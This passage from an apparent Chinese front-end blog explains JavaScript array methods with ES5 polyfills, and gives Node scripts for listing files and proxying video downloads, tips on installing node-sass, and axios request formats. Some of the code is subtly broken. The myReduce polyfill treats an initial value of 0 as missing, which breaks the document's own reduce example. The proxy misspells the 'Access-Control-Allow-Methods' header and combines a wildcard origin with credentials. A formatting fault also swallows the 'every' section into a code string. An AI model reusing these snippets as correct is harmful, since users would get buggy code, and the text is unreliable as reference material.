对于空数组是不会执行回调函数的。</p><p> 回调函数参数：</p><p> currentValue  必需。当前元素；</p><p> index  可选。当前元素的索引值；</p><p> arr  可选。当前元素所属的数组对象。</p></li><li><p><strong>filter(过滤，返回新数组)</strong></p><p> filter() 方法创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。</p><p> 注意： filter() 不会对空数组进行检测。</p><p> 注意： filter() 不会改变原始数组。</p><p> 回调函数参数：</p><p> currentValue  必需。当前元素； </p><p> index  可选。当前元素的索引值； </p><p> arr  可选。当前元素所属的数组对象。</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ages = [<span class="number">32</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">40</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ages.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> item &gt; <span class="number">18</span>;<span class="comment">//返回判断条件为真的数组元素</span></span><br><span class="line">&#125;))</span><br><span class="line"><span class="comment">//输出[32,33,40]</span></span><br></pre></td></tr></table></figure><ol start="3"><li><p><strong>map(映射，返回新数组)</strong></p><p> map() 方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。</p><p> map() 方法按照原始数组元素顺序依次处理元素。</p><p> 注意： map() 不会对空数组进行检测。</p><p> 注意： map() 不会改变原始数组。</p><p> 回调函数参数：</p><p> currentValue  必需。当前元素； </p><p> index  可选。当前元素的索引值； </p><p> arr  可选。当前元素所属的数组对象。</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = [<span class="number">65</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">4</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(numbers.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> item * <span class="number">10</span>;</span><br><span class="line">&#125;))</span><br><span class="line"><span class="comment">//输出[650,440,120,40]</span></span><br></pre></td></tr></table></figure><pre><code>**es5手动实现一下**</code></pre> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">myMap</span>(<span class="params">cb, obj</span>)&#123;</span><br><span class="line">    <span class="comment">// map()不会对空数组进行检测</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">length</span> == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//不改变原数组，不暴露原数组给调用者</span></span><br><span class="line">    <span class="keyword">var</span> _this = <span class="variable language_">this</span>.<span class="title function_">slice</span>();</span><br><span class="line">        <span class="keyword">var</span> arr = [];</span><br><span class="line">        <span class="comment">//如果第二个参数没传，默认是全局对象</span></span><br><span class="line">        obj ? <span class="literal">null</span> : obj = <span class="variable language_">window</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;_this.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        arr.<span class="title function_">push</span>(cb.<span class="title function_">call</span>(obj, _this[i], i, _this));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myMap</span> = myMap;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="string">``</span><span class="string">`   </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">4. **every(判断是否全部元素符合条件，返回布尔值)**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    every() 方法用于检测数组所有元素是否都符合指定条件（通过函数提供）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    every() 方法使用指定函数检测数组中的所有元素：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    如果数组中检测到有一个元素不满足，则整个表达式返回 false ，且剩余的元素不会再进行检测。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    如果所有元素都满足条件，则返回 true。</span></span><br><span class="line"><span class="string">    注意： every() 不会对空数组进行检测。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    注意： every() 不会改变原始数组。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    回调函数参数：</span></span><br><span class="line"><span class="string">    currentValue  必需。当前元素；</span></span><br><span class="line"><span class="string">    index  可选。当前元素的索引值；</span></span><br><span class="line"><span class="string">    arr  可选。当前元素所属的数组对象。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">`</span><span class="string">``</span><span class="variable constant_">JS</span></span><br><span class="line"><span class="keyword">var</span> ages = [<span class="number">32</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">40</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ages.<span class="title function_">every</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> item &gt; <span class="number">18</span>;</span><br><span class="line">&#125;))</span><br><span class="line"><span class="comment">//输出false</span></span><br></pre></td></tr></table></figure><ol start="5"><li><p><strong>reduce(累加)</strong><br> reduce() 方法接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。</p><p> reduce() 可以作为一个高阶函数，用于函数的 compose。</p><p> 注意: reduce() 对于空数组是不会执行回调函数的。</p><p> 回调函数参数：<br> total  必需。初始值, 或者计算结束后的返回值；<br> currentValue  必需。当前元素；<br> index  可选。当前元素的索引值；<br> arr  可选。当前元素所属的数组对象。</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [&#123;<span class="attr">price</span>:<span class="number">30</span>,<span class="attr">count</span>:<span class="number">2</span>&#125;,&#123;<span class="attr">price</span>:<span class="number">40</span>,<span class="attr">count</span>:<span class="number">3</span>&#125;,&#123;<span class="attr">price</span>:<span class="number">50</span>,<span class="attr">count</span>:<span class="number">5</span>&#125;];</span><br><span class="line"><span class="comment">//当数组元素为引用类型时需要注意</span></span><br><span class="line"><span class="keyword">var</span> sum = arr.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> x.<span class="property">price</span>*x.<span class="property">count</span> + y.<span class="property">price</span>*y.<span class="property">count</span>;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sum)</span><br><span class="line"><span class="comment">//输出NaN</span></span><br><span class="line"><span class="comment">//正确应该为</span></span><br><span class="line"><span class="keyword">var</span> sum = arr.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> x + y.<span class="property">price</span>*y.<span class="property">count</span>;</span><br><span class="line">&#125;,<span class="number">0</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sum)</span><br><span class="line"><span class="comment">//输出430</span></span><br></pre></td></tr></table></figure><p><strong>es5手动实现一下</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">myReduce</span>(<span class="params">cb, initValue</span>)&#123;</span><br><span class="line">    <span class="comment">//不对空数组进行检测</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">length</span> == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//不改变原数组，不暴露原数组给调用者</span></span><br><span class="line">        <span class="keyword">var</span> arr = <span class="variable language_">this</span>.<span class="title function_">slice</span>();</span><br><span class="line">        <span class="keyword">var</span> startIndex = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//如果有传第二个参数，则从索引为0开始遍历，否则initValue = arr[0]从索引为1开始遍历</span></span><br><span class="line">        initValue ? startIndex = <span class="number">0</span> : initValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=startIndex; i&lt;arr.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            initValue = <span class="title function_">cb</span>(initValue, arr[i], i, arr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> initValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myReduce</span> = myReduce;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><ol start="6"><li><p><strong>some(判断是否含有符合条件的元素，返回布尔值)</strong></p><p> some() 方法用于检测数组中的元素是否满足指定条件（函数提供）。</p><p> some() 方法会依次执行数组的每个元素：</p><p> 如果有一个元素满足条件，则表达式返回true , 剩余的元素不会再执行检测。<br> 如果没有满足条件的元素，则返回false。</p><p> 注意： some() 不会对空数组进行检测。</p><p> 注意： some() 不会改变原始数组。</p><p> 回调函数参数：<br> currentValue  必需。当前元素；<br> index  可选。当前元素的索引值；<br> arr  可选。当前元素所属的数组对象。</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ages = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">20</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ages.<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> item &gt; <span class="number">28</span>;</span><br><span class="line">&#125;))</span><br><span class="line"><span class="comment">//输出false</span></span><br></pre></td></tr></table></figure><h4 id="node-一些脚本"><a href="#node-一些脚本" class="headerlink" title="node 一些脚本"></a>node 一些脚本</h4><h4 id="深度读取文件内的所有文件名"><a href="#深度读取文件内的所有文件名" class="headerlink" title="深度读取文件内的所有文件名"></a>深度读取文件内的所有文件名</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> join = path.<span class="property">join</span></span><br><span class="line"><span class="keyword">const</span> regx = <span class="regexp">/\.vue$/</span></span><br><span class="line"><span class="keyword">const</span> lessRegx = <span class="regexp">/\.less$/</span></span><br><span class="line"><span class="keyword">let</span> url = <span class="title function_">join</span>(__dirname, <span class="string">&#x27;/views&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getDirs</span>(<span class="params">path</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> dirs = []</span><br><span class="line"><span class="keyword">let</span> files = fs.<span class="title function_">readdirSync</span>(path)</span><br><span class="line"><span class="comment">// console.log(files);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.<span class="property">length</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(lessRegx.<span class="title function_">test</span>(files[i])) <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> (!regx.<span class="title function_">test</span>(files[i])) &#123;</span><br><span class="line"><span class="keyword">let</span> nextUrl = <span class="title function_">join</span>(path, <span class="string">`/<span class="subst">$&#123;files[i]&#125;</span>`</span>)</span><br><span class="line"><span class="comment">// console.log(nextUrl, &#x27;false&#x27;);</span></span><br><span class="line">dirs = [...dirs, ...<span class="title function_">getDirs</span>(nextUrl)]</span><br><span class="line"><span class="comment">// console.log(files[i], &#x27;files============&#x27;)</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// console.log(files[i], &#x27;true&#x27;);</span></span><br><span class="line">dirs.<span class="title function_">push</span>(files[i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dirs</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// console.log(regx.test(&#x27;Login.vue&#x27;),&#x27;+++&#x27;)</span></span><br><span class="line"><span class="title function_">getDirs</span>(url)</span><br><span class="line"><span class="comment">// console.log(getDirs(url))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="处理a链接下载视频，txt等文件会自动打开的问题"><a href="#处理a链接下载视频，txt等文件会自动打开的问题" class="headerlink" title="处理a链接下载视频，txt等文件会自动打开的问题"></a>处理a链接下载视频，txt等文件会自动打开的问题</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 关键部分后端设置响应头proxyResponse.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment;filename=test.mp4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用到代理是因为视频的链接是在腾讯云无法设置  需要转发一下</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> querystring = <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> postData = querystring.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">  <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;你好世界&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  <span class="attr">hostname</span>: <span class="string">&#x27;1500002279.vod2.myqcloud.com&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="number">80</span>,</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/6c9892fcvodcq1500002279/e2b9bed05285890809008953732/f0.mp4&#x27;</span>,</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="comment">// headers: &#123;</span></span><br><span class="line">  <span class="comment">//   &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span></span><br><span class="line">  <span class="comment">//   &#x27;Content-Length&#x27;: Buffer.byteLength(postData)</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Method&#x27;</span>, <span class="string">&#x27;GET,POST&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">url</span>)</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">url</span> === <span class="string">&#x27;/getVideo&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> proxy = http.<span class="title function_">request</span>(options, <span class="function">(<span class="params">proxyResponse</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`状态码: <span class="subst">$&#123;res.statusCode&#125;</span>`</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`响应头: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(res.headers)&#125;</span>`</span>);</span><br><span class="line">      <span class="comment">// res.setEncoding(&#x27;utf8&#x27;);</span></span><br><span class="line">      proxyResponse.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// console.log(`响应主体: $&#123;chunk&#125;`);</span></span><br><span class="line">        res.<span class="title function_">write</span>(chunk, <span class="string">&#x27;binary&#x27;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">      proxyResponse.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;响应中已无数据&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">      &#125;);</span><br><span class="line">      proxyResponse.<span class="property">headers</span>[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment;filename=test.mp4&#x27;</span></span><br><span class="line">      res.<span class="title function_">writeHead</span>(proxyResponse.<span class="property">statusCode</span>, proxyResponse.<span class="property">headers</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    proxy.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`请求遇到问题: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//data只有当请求体数据进来时才会触发</span></span><br><span class="line">    <span class="comment">//尽管没有请求体数据进来，data还是要写，否则不会触发end事件</span></span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;in request length:&#x27;</span>, chunk.<span class="property">length</span>);</span><br><span class="line">      proxy.<span class="title function_">write</span>(chunk, <span class="string">&#x27;binary&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="comment">//向proxy发送求情，这里end方法必须被调用才能发起代理请求</span></span><br><span class="line">      <span class="comment">//所有的客户端请求都需要通过end来发起</span></span><br><span class="line">      proxy.<span class="title function_">end</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">url</span> === <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_">readStaticFile</span>(res)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">url</span> === <span class="string">&#x27;/favicon.ico&#x27;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;error url&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8090</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readStaticFile</span>(<span class="params">res</span>) &#123;</span><br><span class="line">  <span class="comment">// 读取对应路径的文件</span></span><br><span class="line">  fs.<span class="title function_">readFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;index.html&#x27;</span>), <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 找不到文件则返回404</span></span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;404&quot;</span>);</span><br><span class="line">    <span class="comment">// res.end来返回上面读取的内容</span></span><br><span class="line">    res.<span class="title function_">end</span>(data)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--通过a链接直接访问接口即可--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;down&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost:8090/getVideo&quot;</span>&gt;</span>下载1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="整理-node-sass-安装失败的原因及解决办法"><a href="#整理-node-sass-安装失败的原因及解决办法" class="headerlink" title="整理 node-sass 安装失败的原因及解决办法"></a>整理 node-sass 安装失败的原因及解决办法</h4><p>直接使用 <code>cnpm</code> 或者使用淘宝镜像源</p><blockquote><p>npm i node-sass –sass_binary_site&#x3D;<a href="https://npm.taobao.org/mirrors/node-sass/">https://npm.taobao.org/mirrors/node-sass/</a></p></blockquote><p>全局镜像</p><blockquote><p>npm config set sass_binary_site <a href="https://npm.taobao.org/mirrors/node-sass/">https://npm.taobao.org/mirrors/node-sass/</a></p></blockquote><p>也可以设置系统环境变量的方式。示例<br>linux、mac 下</p><blockquote><p>SASS_BINARY_SITE&#x3D;<a href="https://npm.taobao.org/mirrors/node-sass/">https://npm.taobao.org/mirrors/node-sass/</a> npm install node-sass</p></blockquote><p> window 下</p><blockquote><p>set SASS_BINARY_SITE&#x3D;<a href="https://npm.taobao.org/mirrors/node-sass/">https://npm.taobao.org/mirrors/node-sass/</a> &amp;&amp; npm install node-sass</p></blockquote><p><strong>注意：</strong> 安装失败后重装需要先 <code>uninstall</code> 再安装</p><h4 id="axios"><a href="#axios" class="headerlink" title="axios"></a>axios</h4><blockquote><p>使用qs  get请求传数组</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">&#x27;qs&#x27;</span></span><br><span class="line">request.<span class="title function_">get</span>(<span class="string">&#x27;/standingBook/workOrderPlan/pageList&#x27;</span>, &#123;</span><br><span class="line">    params,</span><br><span class="line">    <span class="attr">paramsSerializer</span>: <span class="function">(<span class="params">data</span>) =&gt;</span> qs.<span class="title function_">stringify</span>(data, &#123; <span class="attr">arrayFormat</span>: <span class="string">&#x27;repeat&#x27;</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p><code>Content-Type&#39;: &#39;application/x-www-form-urlencoded; charset=UTF-8</code> 参数格式 a&#x3D;1&amp;b&#x3D;2</p></blockquote><p><img src="https://gitee.com/hisai/image-bed/raw/master/axios-format/forn-urlcode.jpg" alt="image"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">&#x27;qs&#x27;</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">`<span class="subst">$&#123;api.esac&#125;</span>/uniformExchangeDetails/getCleanTotalNum`</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: qs.<span class="title function_">stringify</span>(data, &#123; <span class="attr">indices</span>: <span class="literal">false</span> &#125;)，</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">`Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8`</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><blockquote><p><code>multipart/form-data</code> 参数格式 <strong>多用于文件上传使用</strong> <code>new FormData()</code><br><img src="https://gitee.com/hisai/image-bed/raw/master/axios-format/formdata.jpg" alt="image"></p></blockquote><blockquote><p><code>json</code> </p></blockquote><p><img src="https://gitee.com/hisai/image-bed/raw/master/axios-format/json.jpg" alt="image"></p><h4 id="跨页面通信"><a href="#跨页面通信" class="headerlink" title="跨页面通信"></a>跨页面通信</h4><p><strong>1. 回调函数</strong></p><p><code>index1.html</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">cb</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;回调&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;index2.html&#x27;</span>, <span 